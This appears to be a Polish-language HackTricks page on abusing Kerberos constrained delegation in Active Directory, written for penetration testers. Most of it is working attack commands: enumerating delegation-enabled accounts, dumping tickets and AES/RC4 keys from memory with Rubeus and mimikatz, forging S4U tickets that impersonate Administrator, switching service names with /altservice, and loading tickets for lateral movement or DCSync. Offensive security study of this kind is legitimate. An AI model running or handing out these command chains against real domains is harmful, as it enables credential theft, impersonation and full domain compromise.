# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Korzystając z tego, administrator domeny może **zezwolić** komputerowi na **podszywanie się pod użytkownika lub komputer** w stosunku do **usługi** maszyny.

- **Usługa dla użytkownika do siebie (**_**S4U2self**_**):** Jeśli **konto usługi** ma wartość _userAccountControl_ zawierającą [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), to może uzyskać TGS dla siebie (usługi) w imieniu dowolnego innego użytkownika.
- **Usługa dla użytkownika do proxy (**_**S4U2proxy**_**):** **Konto usługi** może uzyskać TGS w imieniu dowolnego użytkownika do usługi ustawionej w **msDS-AllowedToDelegateTo.** Aby to zrobić, najpierw potrzebuje TGS od tego użytkownika do siebie, ale może użyć S4U2self, aby uzyskać ten TGS przed zażądaniem innego.

**Uwaga**: Jeśli użytkownik jest oznaczony jako ‘_Konto jest wrażliwe i nie może być delegowane_’ w AD, **nie będziesz mógł się pod niego podszyć**.

Oznacza to, że jeśli **skompromitujesz hash usługi**, możesz **podszywać się pod użytkowników** i uzyskać **dostęp** w ich imieniu do **skonfigurowanej usługi** (możliwe **privesc**).

Ponadto, **nie będziesz miał tylko dostępu do usługi, pod którą użytkownik może się podszyć, ale także do każdej usługi**, ponieważ SPN (nazwa usługi żądana) nie jest sprawdzana, tylko uprawnienia. Dlatego, jeśli masz dostęp do **usługi CIFS**, możesz również uzyskać dostęp do **usługi HOST** używając flagi `/altservice` w Rubeus.

Również, **dostęp do usługi LDAP na DC**, jest tym, co jest potrzebne do wykorzystania **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Istnieją **inne sposoby na uzyskanie biletu TGT** lub **RC4** lub **AES256** bez bycia SYSTEM na komputerze, takie jak błąd drukarki i nieograniczona delegacja, relaying NTLM oraz nadużycie usługi certyfikacji Active Directory.
>
> **Mając tylko ten bilet TGT (lub jego skrót), możesz przeprowadzić ten atak bez kompromitacji całego komputera.**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Więcej informacji na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
